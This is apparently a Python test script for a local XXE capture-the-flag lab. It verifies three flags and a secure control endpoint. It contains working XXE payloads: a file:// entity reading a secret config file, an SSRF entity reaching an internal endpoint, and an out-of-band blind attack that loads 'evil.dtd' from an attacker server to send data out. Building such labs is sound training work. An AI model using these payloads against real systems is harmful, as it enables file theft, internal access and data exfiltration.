# -*- coding: utf-8 -*-
"""验证 XMLForge XXE 靶场 3 个 FLAG 可解 + 安全对照打不动"""
import requests

BASE = "http://127.0.0.1:5032"
ATK = "http://127.0.0.1:5033"
SECRET = "C:/Users/clnk/WorkBuddy/2026-07-18-16-15-12/labs/xmlforge_secret.txt"


def check_flags():
    r = requests.get(BASE + "/")
    return {
        "flag1": "FLAG1 读文件 ✅" in r.text,
        "flag2": "FLAG2 SSRF ✅" in r.text,
        "flag3": "FLAG3 OOB盲打 ✅" in r.text,
    }


requests.get(BASE + "/reset")
requests.get(ATK + "/reset")
print("重置后:", check_flags())
print()

# FLAG1 有回显读文件
print("=== FLAG1 有回显读文件 ===")
xml1 = ('<?xml version="1.0"?>\n'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///' + SECRET + '">]>\n'
        '<r>&xxe;</r>')
r = requests.post(BASE + "/parse", data={"xml": xml1})
print("回显含配置:", "DB_PASSWORD" in r.text)
print("FLAG1:", "FLAG1" if check_flags()["flag1"] else "未触发")
print()

# FLAG2 SSRF 打内网
print("=== FLAG2 SSRF 打内网 ===")
xml2 = ('<?xml version="1.0"?>\n'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:5032/internal/flag">]>\n'
        '<r>&xxe;</r>')
r = requests.post(BASE + "/parse", data={"xml": xml2})
print("回显内部接口:", "内部接口数据" in r.text)
print("FLAG2:", "FLAG2" if check_flags()["flag2"] else "未触发")
print()

# FLAG3 无回显 OOB 盲打
print("=== FLAG3 OOB 盲打 ===")
xml3 = ('<?xml version="1.0"?>\n'
        '<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://127.0.0.1:5033/evil.dtd"> %dtd;]>\n'
        '<r>test</r>')
r = requests.post(BASE + "/parse-blind", data={"xml": xml3})
print("盲打页面:", "已处理" in r.text)
r = requests.get(ATK + "/")
print("攻击者站收到 OOB 数据:", "FLAG3" in r.text)
print("FLAG3:", "FLAG3" if check_flags()["flag3"] else "未触发")
print()

# 安全对照：resolve_entities=False
print("=== 安全对照 /parse-secure ===")
r = requests.post(BASE + "/parse-secure", data={"xml": xml1})
print("实体未展开(打不动):", "FLAG1{" not in r.text and "&xxe;" in r.text)
print()

print("=== 最终状态 ===")
print(check_flags())
